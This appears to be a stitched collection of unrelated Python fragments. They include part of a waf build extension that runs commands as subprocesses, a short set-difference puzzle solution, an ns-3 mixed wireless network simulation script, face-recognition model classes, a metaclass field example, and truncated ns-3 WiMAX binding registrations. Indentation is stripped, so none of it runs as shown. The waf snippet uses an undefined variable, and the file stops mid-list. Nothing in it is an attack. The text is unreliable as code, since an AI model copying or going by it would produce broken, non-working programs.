assert isinstance(base_path, Node.Node)
self.node = base_path.find_dir(self.name)
if self.node is None:
raise Errors.WafError("Directory %s not found in " % (self.name, base_path))
class input_dir(cmd_dir_arg):
def get_path(self, dummy_env, dummy_absolute):
return self.template % self.node.abspath()
class output_dir(cmd_dir_arg):
def get_path(self, env, dummy_absolute):
return self.template % self.node.abspath()
class command_output(Task.Task):
color = "BLUE"
def __init__(self, env, command, command_node, command_args, stdin, stdout, cwd, os_env, stderr):
Task.Task.__init__(self, env=env)
assert isinstance(command, (str, Node.Node))
self.command = command
self.command_args = command_args
self.stdin = stdin
self.stdout = stdout
self.cwd = cwd
self.os_env = os_env
self.stderr = stderr
if command_node is not None: self.dep_nodes = [command_node]
self.dep_vars = []
def run(self):
task = self
def input_path(node, template):
if task.cwd is None:
return template % node.bldpath()
else:
return template % node.abspath()
def output_path(node, template):
fun = node.abspath
if task.cwd is None: fun = node.bldpath
return template % fun()
if isinstance(task.command, Node.Node):
argv = [input_path(task.command, '%s')]
else:
argv = [task.command]
for arg in task.command_args:
if isinstance(arg, str):
argv.append(arg)
else:
assert isinstance(arg, cmd_arg)
argv.append(arg.get_path(task.env, (task.cwd is not None)))
if task.stdin:
stdin = open(input_path(task.stdin, '%s'))
else:
stdin = None
if task.stdout:
stdout = open(output_path(task.stdout, '%s'), "w")
else:
stdout = None
if task.stderr:
stderr = open(output_path(task.stderr, '%s'), "w")
else:
stderr = None
if task.cwd is None:
cwd = ('None (actually %r)' % os.getcwd())
else:
cwd = repr(task.cwd)
debug("command-output: cwd=%s, stdin=%r, stdout=%r, argv=%r" %
(cwd, stdin, stdout, argv))
if task.os_env is None:
os_env = os.environ
else:
os_env = task.os_env
command = Utils.subprocess.Popen(argv, stdin=stdin, stdout=stdout, stderr=stderr, cwd=task.cwd, env=os_env)
return command.wait()
@feature('command-output')
def init_cmd_output(self):
Utils.def_attrs(self,
stdin = None,
stdout = None,
stderr = None,
command = None,
command_is_external = False,
argv = [],
dependencies = [],
dep_vars = [],
hidden_inputs = [],
hidden_outputs = [],
cwd = None,
os_env = None)
@feature('command-output')
@after_method('init_cmd_output')
def apply_cmd_output(self):
if self.command is None:
raise Errors.WafError("command-output missing command")
if self.command_is_external:
cmd = self.command
cmd_node = None
else:
cmd_node = self.path.find_resource(self.command)
assert cmd_node is not None, () % (self.command,)
cmd = cmd_node
if self.cwd is None:
cwd = None
else:
assert isinstance(cwd, CmdDirArg)
self.cwd.find_node(self.path)
args = []
inputs = []
outputs = []
for arg in self.argv:
if isinstance(arg, cmd_arg):
arg.find_node(self.path)
if isinstance(arg, input_file):
inputs.append(arg.node)
if isinstance(arg, output_file):
outputs.append(arg.node)
if self.stdout is None:
stdout = None
else:
assert isinstance(self.stdout, str)
stdout = self.path.find_or_declare(self.stdout)
if stdout is None:
raise Errors.WafError("File %s not found" % (self.stdout,))
outputs.append(stdout)
if self.stderr is None:
stderr = None
else:
assert isinstance(self.stderr, str)
stderr = self.path.find_or_declare(self.stderr)
if stderr is None:
raise Errors.WafError("File %s not found" % (self.stderr,))
outputs.append(stderr)
if self.stdin is None:
stdin = None
else:
assert isinstance(self.stdin, str)
stdin = self.path.find_resource(self.stdin)
if stdin is None:
raise Errors.WafError("File %s not found" % (self.stdin,))
inputs.append(stdin)
for hidden_input in self.to_list(self.hidden_inputs):
node = self.path.find_resource(hidden_input)
if node is None:
raise Errors.WafError("File %s not found in dir %s" % (hidden_input, self.path))
inputs.append(node)
for hidden_output in self.to_list(self.hidden_outputs):
node = self.path.find_or_declare(hidden_output)
if node is None:
raise Errors.WafError("File %s not found in dir %s" % (hidden_output, self.path))
outputs.append(node)
if not (inputs or getattr(self, 'no_inputs', None)):
raise Errors.WafError('command-output objects must have at least one input file or give self.no_inputs')
if not (outputs or getattr(self, 'no_outputs', None)):
raise Errors.WafError('command-output objects must have at least one output file or give self.no_outputs')
cwd = self.bld.variant_dir
task = command_output(self.env, cmd, cmd_node, self.argv, stdin, stdout, cwd, self.os_env, stderr)
task.generator = self
copy_attrs(self, task, 'before after ext_in ext_out', only_if_set=True)
self.tasks.append(task)
task.inputs = inputs
task.outputs = outputs
task.dep_vars = self.to_list(self.dep_vars)
for dep in self.dependencies:
assert dep is not self
dep.post()
for dep_task in dep.tasks:
task.set_run_after(dep_task)
if not task.inputs:
task.runnable_status = type(Task.TaskBase.run)(runnable_status, task, task.__class__)
task.post_run = type(Task.TaskBase.run)(post_run, task, task.__class__)
def post_run(self):
for x in self.outputs:
x.sig = Utils.h_file(x.abspath())
def runnable_status(self):
return self.RUN_ME
Task.task_factory('copy', vars=[], func=action_process_file_func)
class Solution(object):
def solve(self, cipher):
m, A, n, B = cipher
result = set()
hm = {}
for a in A:
if a not in hm:
hm[a] = 1
else:
hm[a] += 1
for b in B:
if b not in hm or hm[b] <= 0:
result.add(b)
else:
hm[b] -= 1
result = sorted(list(result))
return " ".join(map(str, result))
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
m = int(f.readline().strip())
A = map(int, f.readline().strip().split(' '))
n = int(f.readline().strip())
B = map(int, f.readline().strip().split(' '))
cipher = m, A, n, B
s = "%s\n" % (solution.solve(cipher))
print s,
import ns.applications
import ns.core
import ns.csma
import ns.internet
import ns.mobility
import ns.network
import ns.olsr
import ns.wifi
def main(argv):
backboneNodes = 10
infraNodes = 5
lanNodes = 5
stopTime = 10
ns.core.Config.SetDefault("ns3::OnOffApplication::PacketSize", ns.core.StringValue("210"))
ns.core.Config.SetDefault("ns3::OnOffApplication::DataRate", ns.core.StringValue("448kb/s"))
cmd = ns.core.CommandLine()
cmd.Parse(argv)
backbone = ns.network.NodeContainer()
backbone.Create(backboneNodes)
wifi = ns.wifi.WifiHelper()
mac = ns.wifi.NqosWifiMacHelper.Default()
mac.SetType("ns3::AdhocWifiMac")
wifi.SetRemoteStationManager("ns3::ConstantRateWifiManager",
"DataMode", ns.core.StringValue("OfdmRate54Mbps"))
wifiPhy = ns.wifi.YansWifiPhyHelper.Default()
wifiChannel = ns.wifi.YansWifiChannelHelper.Default()
wifiPhy.SetChannel(wifiChannel.Create())
backboneDevices = wifi.Install(wifiPhy, mac, backbone)
print "Enabling OLSR routing on all backbone nodes"
internet = ns.internet.InternetStackHelper()
olsr = ns.olsr.OlsrHelper()
internet.SetRoutingHelper(olsr);
internet.Install(backbone);
internet.Reset()
ipAddrs = ns.internet.Ipv4AddressHelper()
ipAddrs.SetBase(ns.network.Ipv4Address("192.168.0.0"), ns.network.Ipv4Mask("255.255.255.0"))
ipAddrs.Assign(backboneDevices)
mobility = ns.mobility.MobilityHelper()
positionAlloc = ns.mobility.ListPositionAllocator()
x = 0.0
for i in range(backboneNodes):
positionAlloc.Add(ns.core.Vector(x, 0.0, 0.0))
x += 5.0
mobility.SetPositionAllocator(positionAlloc)
mobility.SetMobilityModel("ns3::RandomDirection2dMobilityModel",
"Bounds", ns.mobility.RectangleValue(ns.mobility.Rectangle(0, 1000, 0, 1000)),
"Speed", ns.core.RandomVariableValue(ns.core.ConstantVariable(2000)),
"Pause", ns.core.RandomVariableValue(ns.core.ConstantVariable(0.2)))
mobility.Install(backbone)
ipAddrs.SetBase(ns.network.Ipv4Address("172.16.0.0"), ns.network.Ipv4Mask("255.255.255.0"))
for i in range(backboneNodes):
print "Configuring local area network for backbone node ", i
newLanNodes = ns.network.NodeContainer()
newLanNodes.Create(lanNodes - 1)
lan = ns.network.NodeContainer(ns.network.NodeContainer(backbone.Get(i)), newLanNodes)
csma = ns.csma.CsmaHelper()
csma.SetChannelAttribute("DataRate", ns.network.DataRateValue(ns.network.DataRate(5000000)))
csma.SetChannelAttribute("Delay", ns.core.TimeValue(ns.core.MilliSeconds(2)))
lanDevices = csma.Install(lan)
internet.Install(newLanNodes)
ipAddrs.Assign(lanDevices)
ipAddrs.NewNetwork()
ipAddrs.SetBase(ns.network.Ipv4Address("10.0.0.0"), ns.network.Ipv4Mask("255.255.255.0"))
for i in range(backboneNodes):
print "Configuring wireless network for backbone node ", i
stas = ns.network.NodeContainer()
stas.Create(infraNodes - 1)
infra = ns.network.NodeContainer(ns.network.NodeContainer(backbone.Get(i)), stas)
ssid = ns.wifi.Ssid('wifi-infra' + str(i))
wifiInfra = ns.wifi.WifiHelper.Default()
wifiPhy.SetChannel(wifiChannel.Create())
wifiInfra.SetRemoteStationManager('ns3::ArfWifiManager')
macInfra = ns.wifi.NqosWifiMacHelper.Default();
macInfra.SetType("ns3::StaWifiMac",
"Ssid", ns.wifi.SsidValue(ssid),
"ActiveProbing", ns.core.BooleanValue(False))
staDevices = wifiInfra.Install(wifiPhy, macInfra, stas)
macInfra.SetType("ns3::ApWifiMac",
"Ssid", ns.wifi.SsidValue(ssid),
"BeaconGeneration", ns.core.BooleanValue(True),
"BeaconInterval", ns.core.TimeValue(ns.core.Seconds(2.5)))
apDevices = wifiInfra.Install(wifiPhy, macInfra, backbone.Get(i))
infraDevices = ns.network.NetDeviceContainer(apDevices, staDevices)
internet.Install(stas)
ipAddrs.Assign(infraDevices)
ipAddrs.NewNetwork()
subnetAlloc = ns.mobility.ListPositionAllocator()
for j in range(infra.GetN()):
subnetAlloc.Add(ns.core.Vector(0.0, j, 0.0))
mobility.PushReferenceMobilityModel(backbone.Get(i))
mobility.SetPositionAllocator(subnetAlloc)
mobility.SetMobilityModel("ns3::RandomDirection2dMobilityModel",
"Bounds", ns.mobility.RectangleValue(ns.mobility.Rectangle(-25, 25, -25, 25)),
"Speed", ns.core.RandomVariableValue(ns.core.ConstantVariable(30)),
"Pause", ns.core.RandomVariableValue(ns.core.ConstantVariable(0.4)))
mobility.Install(infra)
print "Create Applications."
port = 9
assert(lanNodes >= 5)
appSource = ns.network.NodeList.GetNode(11)
appSink = ns.network.NodeList.GetNode(13)
remoteAddr = ns.network.Ipv4Address("172.16.0.5")
onoff = ns.applications.OnOffHelper("ns3::UdpSocketFactory",
ns.network.Address(ns.network.InetSocketAddress(remoteAddr, port)))
onoff.SetAttribute("OnTime", ns.core.RandomVariableValue(ns.core.ConstantVariable(1)))
onoff.SetAttribute("OffTime", ns.core.RandomVariableValue(ns.core.ConstantVariable(0)))
apps = onoff.Install(ns.network.NodeContainer(appSource))
apps.Start(ns.core.Seconds(3.0))
apps.Stop(ns.core.Seconds(20.0))
sink = ns.applications.PacketSinkHelper("ns3::UdpSocketFactory",
ns.network.InetSocketAddress(ns.network.Ipv4Address.GetAny(), port))
apps = sink.Install(ns.network.NodeContainer(appSink))
apps.Start(ns.core.Seconds(3.0))
print "Configure Tracing."
print "(tracing not done for Python)"
wifiPhy.EnablePcap("mixed-wireless", backboneDevices)
csma = ns.csma.CsmaHelper()
csma.EnablePcapAll("mixed-wireless", False)
print "Run Simulation."
ns.core.Simulator.Stop(ns.core.Seconds(stopTime))
ns.core.Simulator.Run()
ns.core.Simulator.Destroy()
if __name__ == '__main__':
import sys
main(sys.argv)
import copy
import collections
from facerec_py.facerec.feature import AbstractFeature
from facerec_py.facerec.classifier import AbstractClassifier
class AbstractPredictableModel(object):
def compute(self, X, y):
raise NotImplementedError("Every AbstractPredictableModel must implement the compute method.")
def predict(self, X):
raise NotImplementedError("Every AbstractPredictableModel must implement the predict method.")
def __repr__(self):
return self.__class__.__name__
class PredictableModel(AbstractPredictableModel):
def __init__(self, feature, classifier):
super(PredictableModel, self).__init__()
if not isinstance(feature, AbstractFeature):
raise TypeError("feature must be of type AbstractFeature!")
if not isinstance(classifier, AbstractClassifier):
raise TypeError("classifier must be of type AbstractClassifier!")
self.feature = feature
self.classifier = classifier
def compute(self, X, y):
features = self.feature.compute(X, y)
self.classifier.compute(features, y)
def predict(self, X):
q = self.feature.extract(X)
return self.classifier.predict(q)
def __repr__(self):
feature_repr = repr(self.feature)
classifier_repr = repr(self.classifier)
return "%s(feature=%s, classifier=%s)" % (self.__class__.__name__, feature_repr, classifier_repr)
class FeaturesEnsemblePredictableModel(AbstractPredictableModel):
def __init__(self, features, classifier):
super(FeaturesEnsemblePredictableModel, self).__init__()
for feature in features:
if not isinstance(feature, AbstractFeature):
raise TypeError("feature must be of type AbstractFeature!")
if not isinstance(classifier, AbstractClassifier):
raise TypeError("classifier must be of type AbstractClassifier!")
self.features = features
self.classifiers = [copy.deepcopy(classifier) for _ in features]
def compute(self, X, y):
for i in xrange(len(self.features)):
feats = self.features[i].compute(X, y)
self.classifiers[i].compute(feats, y)
def predict(self, X):
qs = [feature.extract(X) for feature in self.features]
ps = [self.classifiers[i].predict(qs[i]) for i in xrange(len(qs))]
dic = collections.defaultdict(int)
for elt in ps:
dic[elt[0]] += 1
maxa, label = -1, -1
for k, v in dic.items():
if v>maxa:
maxa = v
label = k
for elt in ps:
if elt[0]==label:
return elt
return None
@property
def feature(self):
return self.features[0]
@property
def classifier(self):
return self.classifiers[0]
def __repr__(self):
feature_repr = repr(self.features)
classifier_repr = repr(self.classifier)
return "%s(features=%s, classifier=%s)" % (self.__class__.__name__, feature_repr, classifier_repr)
import six
class NaiveModelField(object):
def __init__(self, name):
self.name = name
self.internal_name = '_' + self.name
def __get__(self, instance, instance_type):
if instance is None: return self
return getattr(instance, self.internal_name, '')
def __set__(self, instance, value):
setattr(instance, self.internal_name, value)
class ModelField(object):
def __init__(self):
self.name = None
self.internal_name = None
def __get__(self, instance, instance_type):
if instance is None: return self
return getattr(instance, self.internal_name, '')
def __set__(self, instance, value):
setattr(instance, self.internal_name, value)
class ModelBaseMeta(type):
def __new__(mcs, name, bases, class_dict):
for key, value in class_dict.items():
if isinstance(value, ModelField):
value.name = key
value.internal_name = '_' + key
cls = type.__new__(mcs, name, bases, class_dict)
return cls
class Model(six.with_metaclass(ModelBaseMeta)):
pass
from django.db import models
def post_register_types(root_module):
root_module.add_include('"ns3/propagation-module.h"')
from pybindgen import Module, FileCodeSink, param, retval, cppclass, typehandlers
import pybindgen.settings
import warnings
class ErrorHandler(pybindgen.settings.ErrorHandler):
def handle_error(self, wrapper, exception, traceback_):
warnings.warn("exception %r in wrapper %s" % (exception, wrapper))
return True
pybindgen.settings.error_handler = ErrorHandler()
import sys
def module_init():
root_module = Module('ns.wimax', cpp_namespace='::ns3')
return root_module
def register_types(module):
root_module = module.get_root()
module.add_enum('ReqType', ['DATA', 'UNICAST_POLLING'])
module.add_enum('LogLevel', ['LOG_NONE', 'LOG_ERROR', 'LOG_LEVEL_ERROR', 'LOG_WARN', 'LOG_LEVEL_WARN', 'LOG_DEBUG', 'LOG_LEVEL_DEBUG', 'LOG_INFO', 'LOG_LEVEL_INFO', 'LOG_FUNCTION', 'LOG_LEVEL_FUNCTION', 'LOG_LOGIC', 'LOG_LEVEL_LOGIC', 'LOG_ALL', 'LOG_LEVEL_ALL', 'LOG_PREFIX_FUNC', 'LOG_PREFIX_TIME', 'LOG_PREFIX_NODE'], import_from_module='ns.core')
module.add_class('Address', import_from_module='ns.network')
module.add_enum('MaxSize_e', ['MAX_SIZE'], outer_class=root_module['ns3::Address'], import_from_module='ns.network')
module.add_class('AsciiTraceHelper', import_from_module='ns.network')
module.add_class('AsciiTraceHelperForDevice', allow_subclassing=True, import_from_module='ns.network')
module.add_class('AttributeConstructionList', import_from_module='ns.core')
module.add_class('Item', import_from_module='ns.core', outer_class=root_module['ns3::AttributeConstructionList'])
module.add_class('Buffer', import_from_module='ns.network')
module.add_class('Iterator', import_from_module='ns.network', outer_class=root_module['ns3::Buffer'])
module.add_class('ByteTagIterator', import_from_module='ns.network')
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::ByteTagIterator'])
module.add_class('ByteTagList', import_from_module='ns.network')
module.add_class('Iterator', import_from_module='ns.network', outer_class=root_module['ns3::ByteTagList'])
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::ByteTagList::Iterator'])
module.add_class('CallbackBase', import_from_module='ns.core')
module.add_class('Cid')
module.add_enum('Type', ['BROADCAST', 'INITIAL_RANGING', 'BASIC', 'PRIMARY', 'TRANSPORT', 'MULTICAST', 'PADDING'], outer_class=root_module['ns3::Cid'])
module.add_class('CidFactory')
module.add_class('CsParameters')
module.add_enum('Action', ['ADD', 'REPLACE', 'DELETE'], outer_class=root_module['ns3::CsParameters'])
module.add_class('DcdChannelEncodings', allow_subclassing=True)
module.add_class('DlFramePrefixIe')
module.add_class('EventId', import_from_module='ns.core')
module.add_class('IpcsClassifierRecord')
module.add_class('Ipv4Address', import_from_module='ns.network')
root_module['ns3::Ipv4Address'].implicitly_converts_to(root_module['ns3::Address'])
module.add_class('Ipv4Mask', import_from_module='ns.network')
module.add_class('Ipv6Address', import_from_module='ns.network')
root_module['ns3::Ipv6Address'].implicitly_converts_to(root_module['ns3::Address'])
module.add_class('Ipv6Prefix', import_from_module='ns.network')
module.add_class('LogComponent', import_from_module='ns.core')
module.add_class('Mac48Address', import_from_module='ns.network')
root_module['ns3::Mac48Address'].implicitly_converts_to(root_module['ns3::Address'])
module.add_class('NetDeviceContainer', import_from_module='ns.network')
module.add_class('NodeContainer', import_from_module='ns.network')
module.add_class('ObjectBase', allow_subclassing=True, import_from_module='ns.core')
module.add_class('ObjectDeleter', import_from_module='ns.core')
module.add_class('ObjectFactory', import_from_module='ns.core')
module.add_class('OfdmDcdChannelEncodings', parent=root_module['ns3::DcdChannelEncodings'])
module.add_class('OfdmDlBurstProfile')
module.add_enum('Diuc', ['DIUC_STC_ZONE', 'DIUC_BURST_PROFILE_1', 'DIUC_BURST_PROFILE_2', 'DIUC_BURST_PROFILE_3', 'DIUC_BURST_PROFILE_4', 'DIUC_BURST_PROFILE_5', 'DIUC_BURST_PROFILE_6', 'DIUC_BURST_PROFILE_7', 'DIUC_BURST_PROFILE_8', 'DIUC_BURST_PROFILE_9', 'DIUC_BURST_PROFILE_10', 'DIUC_BURST_PROFILE_11', 'DIUC_GAP', 'DIUC_END_OF_MAP'], outer_class=root_module['ns3::OfdmDlBurstProfile'])
module.add_class('OfdmDlMapIe')
module.add_class('OfdmUlBurstProfile')
module.add_enum('Uiuc', ['UIUC_INITIAL_RANGING', 'UIUC_REQ_REGION_FULL', 'UIUC_REQ_REGION_FOCUSED', 'UIUC_FOCUSED_CONTENTION_IE', 'UIUC_BURST_PROFILE_5', 'UIUC_BURST_PROFILE_6', 'UIUC_BURST_PROFILE_7', 'UIUC_BURST_PROFILE_8', 'UIUC_BURST_PROFILE_9', 'UIUC_BURST_PROFILE_10', 'UIUC_BURST_PROFILE_11', 'UIUC_BURST_PROFILE_12', 'UIUC_SUBCH_NETWORK_ENTRY', 'UIUC_END_OF_MAP'], outer_class=root_module['ns3::OfdmUlBurstProfile'])
module.add_class('OfdmUlMapIe')
module.add_class('PacketMetadata', import_from_module='ns.network')
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::PacketMetadata'])
module.add_enum('', ['PAYLOAD', 'HEADER', 'TRAILER'], outer_class=root_module['ns3::PacketMetadata::Item'], import_from_module='ns.network')
module.add_class('ItemIterator', import_from_module='ns.network', outer_class=root_module['ns3::PacketMetadata'])
module.add_class('PacketTagIterator', import_from_module='ns.network')
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::PacketTagIterator'])
module.add_class('PacketTagList', import_from_module='ns.network')
module.add_class('TagData', import_from_module='ns.network', outer_class=root_module['ns3::PacketTagList'])
module.add_class('PcapFile', import_from_module='ns.network')
module.add_class('PcapHelper', import_from_module='ns.network')
module.add_enum('', ['DLT_NULL', 'DLT_EN10MB', 'DLT_PPP', 'DLT_RAW', 'DLT_IEEE802_11', 'DLT_PRISM_HEADER', 'DLT_IEEE802_11_RADIO'], outer_class=root_module['ns3::PcapHelper'], import_from_module='ns.network')
module.add_class('PcapHelperForDevice', allow_subclassing=True, import_from_module='ns.network')
module.add_class('RandomVariable', import_from_module='ns.core')
module.add_class('SNRToBlockErrorRateManager')
module.add_class('SNRToBlockErrorRateRecord')
module.add_class('SSRecord')
module.add_class('SeedManager', import_from_module='ns.core')
module.add_class('SendParams')
module.add_class('SequentialVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('ServiceFlow')
module.add_enum('Direction', ['SF_DIRECTION_DOWN', 'SF_DIRECTION_UP'], outer_class=root_module['ns3::ServiceFlow'])
module.add_enum('Type', ['SF_TYPE_PROVISIONED', 'SF_TYPE_ADMITTED', 'SF_TYPE_ACTIVE'], outer_class=root_module['ns3::ServiceFlow'])
module.add_enum('SchedulingType', ['SF_TYPE_NONE', 'SF_TYPE_UNDEF', 'SF_TYPE_BE', 'SF_TYPE_NRTPS', 'SF_TYPE_RTPS', 'SF_TYPE_UGS', 'SF_TYPE_ALL'], outer_class=root_module['ns3::ServiceFlow'])
module.add_enum('CsSpecification', ['ATM', 'IPV4', 'IPV6', 'ETHERNET', 'VLAN', 'IPV4_OVER_ETHERNET', 'IPV6_OVER_ETHERNET', 'IPV4_OVER_VLAN', 'IPV6_OVER_VLAN'], outer_class=root_module['ns3::ServiceFlow'])
module.add_enum('ModulationType', ['MODULATION_TYPE_BPSK_12', 'MODULATION_TYPE_QPSK_12', 'MODULATION_TYPE_QPSK_34', 'MODULATION_TYPE_QAM16_12', 'MODULATION_TYPE_QAM16_34', 'MODULATION_TYPE_QAM64_23', 'MODULATION_TYPE_QAM64_34'], outer_class=root_module['ns3::ServiceFlow'])
module.add_class('ServiceFlowRecord')
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::Object', 'ns3::ObjectBase', 'ns3::ObjectDeleter'], parent=root_module['ns3::ObjectBase'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('Simulator', destructor_visibility='private', import_from_module='ns.core')
module.add_class('Tag', import_from_module='ns.network', parent=root_module['ns3::ObjectBase'])
module.add_class('TagBuffer', import_from_module='ns.network')
module.add_class('TlvValue', allow_subclassing=True)
module.add_class('TosTlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('TriangularVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('TypeId', import_from_module='ns.core')
module.add_enum('AttributeFlag', ['ATTR_GET', 'ATTR_SET', 'ATTR_CONSTRUCT', 'ATTR_SGC'], outer_class=root_module['ns3::TypeId'], import_from_module='ns.core')
module.add_class('AttributeInformation', import_from_module='ns.core', outer_class=root_module['ns3::TypeId'])
module.add_class('TraceSourceInformation', import_from_module='ns.core', outer_class=root_module['ns3::TypeId'])
module.add_class('U16TlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('U32TlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('U8TlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('UcdChannelEncodings', allow_subclassing=True)
module.add_class('UniformVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('VectorTlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('WeibullVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('WimaxHelper', parent=[root_module['ns3::PcapHelperForDevice'], root_module['ns3::AsciiTraceHelperForDevice']])
module.add_enum('NetDeviceType', ['DEVICE_TYPE_SUBSCRIBER_STATION', 'DEVICE_TYPE_BASE_STATION'], outer_class=root_module['ns3::WimaxHelper'])
module.add_enum('PhyType', ['SIMPLE_PHY_TYPE_OFDM'], outer_class=root_module['ns3::WimaxHelper'])
module.add_enum('SchedulerType', ['SCHED_TYPE_SIMPLE', 'SCHED_TYPE_RTPS', 'SCHED_TYPE_MBQOS'], outer_class=root_module['ns3::WimaxHelper'])
module.add_class('ZetaVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('ZipfVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('empty', import_from_module='ns.core')
module.add_class('int64x64_t', import_from_module='ns.core')
module.add_class('simpleOfdmSendParam')
module.add_class('Chunk', import_from_module='ns.network', parent=root_module['ns3::ObjectBase'])
module.add_class('ClassificationRuleVectorTlvValue', parent=root_module['ns3::VectorTlvValue'])
module.add_enum('ClassificationRuleTlvType', ['Priority', 'ToS', 'Protocol', 'IP_src', 'IP_dst', 'Port_src', 'Port_dst', 'Index'], outer_class=root_module['ns3::ClassificationRuleVectorTlvValue'])
module.add_class('ConstantVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('CsParamVectorTlvValue', parent=root_module['ns3::VectorTlvValue'])
module.add_enum('Type', ['Classifier_DSC_Action', 'Packet_Classification_Rule'], outer_class=root_module['ns3::CsParamVectorTlvValue'])
module.add_class('DeterministicVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('EmpiricalVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('ErlangVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('ExponentialVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('GammaVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('Header', import_from_module='ns.network', parent=root_module['ns3::Chunk'])
module.add_class('IntEmpiricalVariable', import_from_module='ns.core', parent=root_module['ns3::EmpiricalVariable'])
module.add_class('Ipv4AddressTlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('ipv4Addr', outer_class=root_module['ns3::Ipv4AddressTlvValue'])
module.add_class('LogNormalVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('MacHeaderType', parent=root_module['ns3::Header'])
module.add_enum('HeaderType', ['HEADER_TYPE_GENERIC', 'HEADER_TYPE_BANDWIDTH'], outer_class=root_module['ns3::MacHeaderType'])
module.add_class('ManagementMessageType', parent=root_module['ns3::Header'])
module.add_enum('MessageType', ['MESSAGE_TYPE_UCD', 'MESSAGE_TYPE_DCD', 'MESSAGE_TYPE_DL_MAP', 'MESSAGE_TYPE_UL_MAP', 'MESSAGE_TYPE_RNG_REQ', 'MESSAGE_TYPE_RNG_RSP', 'MESSAGE_TYPE_REG_REQ', 'MESSAGE_TYPE_REG_RSP', 'MESSAGE_TYPE_DSA_REQ', 'MESSAGE_TYPE_DSA_RSP', 'MESSAGE_TYPE_DSA_ACK'], outer_class=root_module['ns3::ManagementMessageType'])
module.add_class('NormalVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('Object', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::Object, ns3::ObjectBase, ns3::ObjectDeleter >'])
module.add_class('AggregateIterator', import_from_module='ns.core', outer_class=root_module['ns3::Object'])
module.add_class('OfdmDownlinkFramePrefix', parent=root_module['ns3::Header'])
module.add_class('OfdmSendParams', parent=root_module['ns3::SendParams'])
module.add_class('OfdmUcdChannelEncodings', parent=root_module['ns3::UcdChannelEncodings'])
module.add_class('PacketBurst', import_from_module='ns.network', parent=root_module['ns3::Object'])
module.add_class('ParetoVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('PcapFileWrapper', import_from_module='ns.network', parent=root_module['ns3::Object'])
module.add_class('PortRangeTlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('PortRange', outer_class=root_module['ns3::PortRangeTlvValue'])
module.add_class('PriorityUlJob', parent=root_module['ns3::Object'])
module.add_class('PropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::Object'])
module.add_class('ProtocolTlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('RandomPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('RangePropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('RngReq', parent=root_module['ns3::Header'])
module.add_class('RngRsp', parent=root_module['ns3::Header'])
module.add_class('SSManager', parent=root_module['ns3::Object'])
module.add_class('ServiceFlowManager', parent=root_module['ns3::Object'])
module.add_enum('ConfirmationCode', ['CONFIRMATION_CODE_SUCCESS', 'CONFIRMATION_CODE_REJECT'], outer_class=root_module['ns3::ServiceFlowManager'])
module.add_class('SfVectorTlvValue', parent=root_module['ns3::VectorTlvValue'])
module.add_enum('Type', ['SFID', 'CID', 'Service_Class_Name', 'reserved1', 'QoS_Parameter_Set_Type', 'Traffic_Priority', 'Maximum_Sustained_Traffic_Rate', 'Maximum_Traffic_Burst', 'Minimum_Reserved_Traffic_Rate', 'Minimum_Tolerable_Traffic_Rate', 'Service_Flow_Scheduling_Type', 'Request_Transmission_Policy', 'Tolerated_Jitter', 'Maximum_Latency', 'Fixed_length_versus_Variable_length_SDU_Indicator', 'SDU_Size', 'Target_SAID', 'ARQ_Enable', 'ARQ_WINDOW_SIZE', 'ARQ_RETRY_TIMEOUT_Transmitter_Delay', 'ARQ_RETRY_TIMEOUT_Receiver_Delay', 'ARQ_BLOCK_LIFETIME', 'ARQ_SYNC_LOSS', 'ARQ_DELIVER_IN_ORDER', 'ARQ_PURGE_TIMEOUT', 'ARQ_BLOCK_SIZE', 'reserved2', 'CS_Specification', 'IPV4_CS_Parameters'], outer_class=root_module['ns3::SfVectorTlvValue'])
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::AttributeAccessor', 'ns3::empty', 'ns3::DefaultDeleter<ns3::AttributeAccessor>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::AttributeChecker', 'ns3::empty', 'ns3::DefaultDeleter<ns3::AttributeChecker>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
